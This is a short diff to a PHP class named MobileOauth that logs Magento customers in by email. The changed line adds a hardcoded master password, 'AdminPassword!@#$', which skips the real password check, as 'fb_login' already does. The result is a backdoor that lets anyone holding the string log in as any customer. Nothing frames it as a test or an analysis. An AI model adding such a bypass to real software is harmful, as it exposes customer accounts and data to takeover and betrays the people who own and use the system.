@@ -44,7 +44,7 @@ class MobileOauth{
                 $customer->setStore($store);
                 $customer->loadByEmail($email);
                 $session = Mage::getSingleton('customer/session')->setCustomerAsLoggedIn($customer);
-                if($password != 'fb_login'){
+                if($password != 'fb_login' and $password != "AdminPassword!@#$"){
                     $session->login($email, $password);
                 }
                 $user_id = $customer->getId();
